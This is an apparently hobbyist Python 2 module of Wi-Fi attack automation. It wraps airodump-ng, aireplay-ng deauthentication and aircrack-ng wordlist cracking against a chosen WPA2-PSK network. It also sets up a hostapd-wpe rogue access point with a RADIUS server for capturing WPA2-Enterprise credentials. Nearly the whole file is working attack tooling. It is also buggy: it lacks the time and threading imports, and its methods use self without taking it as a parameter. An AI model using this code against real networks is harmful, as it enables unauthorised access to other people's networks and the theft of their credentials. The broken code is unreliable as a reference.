import os


class wpa2_attack:
    def __init__(self, ssid, bssid, channel):
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel

    def tester(self):
        print 'This is the testing function ' + self.ssid + ' : ' + self.bssid

    def wpa2_psk_hack(ssid, bssid, channel):
        g_ssid = ssid
        g_bssid = bssid
        g_channel = channel

        def exe1():
            os.system(
                'gnome-terminal -x airodump-ng -w ./Modules/capture/"' + self.ssid + '" --essid "' + self.ssid + '" --bssid ' + self.bssid + ' -c ' + str(
                    self.channel) + ' mon0 &')
            global out, err, wpa2execute
            os.system('gnome-terminal -x aireplay-ng --deauth 20 -e "' + self.ssid + '" -a ' + self.bssid + ' mon0 &')
            time.sleep(4)
            # ~ while wpa2execute:

            os.system(
                "aircrack-ng ./Modules/capture/'" + self.ssid + "*.cap' -e '" + self.ssid + "' -b " + self.bssid + " -w /usr/share/wordlists/fasttrack.txt > ./Modules/Logs/wizard_ssid.tmp &")
            # ~ print "aircrack-ng ./Modules/capture/"+g_ssid+"*.cap -e "+g_ssid+" -b "+g_bssid+ " -w /usr/share/wordlists/fasttrack.txt"
            handshake_test = ''
            myfile = open('./Modules/Logs/wizard_ssid.tmp', 'r').read()
            if 'Passphrase' in myfile:

                os.system("kill `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
                os.system("kill `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
                os.system("echo '' > ./Modules/Logs/wizard_ssid.tmp")


            # ~ global wpa2execute
            # ~
            # ~ wpa2execute = False
            # ~ break
            # ~ exit
            else:
                print 'capture not found'
                time.sleep(10)

        wpa2thread = threading.Thread(target=exe1)
        wpa2thread.start()
        wpa2thread.join()

    def wpa2_ent_wizard(iface, ssid):
        configuration = """interface=%s
	driver=nl80211
	ssid=%s
	country_code=DE
	logger_stdout=-1
	logger_stdout_level=0
	dump_file=/tmp/hostapd.dump
	ieee8021x=1
	eapol_key_index_workaround=0
	own_ip_addr=127.0.0.1
	auth_server_addr=127.0.0.1
	auth_server_port=1812
	auth_server_shared_secret=testing123
	auth_algs=3
	wpa=2
	wpa_key_mgmt=WPA-EAP
	channel=6
	wpa_pairwise=CCMP
	rsn_pairwise=CCMP
	""" % (iface, ssid)

        hostapd_conf = open('./Modules/hostapd-wpe.conf-wizard', 'wb')
        hostapd_conf.write(configuration)
        hostapd_conf.close()
        os.system("/sbin/ldconfig -v")
        os.system("gnome-terminal -x radiusd -X &")
        os.system("/usr/local/etc/raddb/certs/bootstrap &")

        time.sleep(300)

        os.system("gnome-terminal -x hostapd ./Modules/hostapd-wpe.conf-wizard &")
        time.sleep(10)
        os.system("kill `ps aux | grep radiusd | head -1 | awk '{print $2}'`")
        os.system("kill `ps aux | grep hostapd | head -1 | awk '{print $2}'`")

# ~ tester = wpa2_attack('myssid', 'mybssid',12)
# ~ tester.tester()
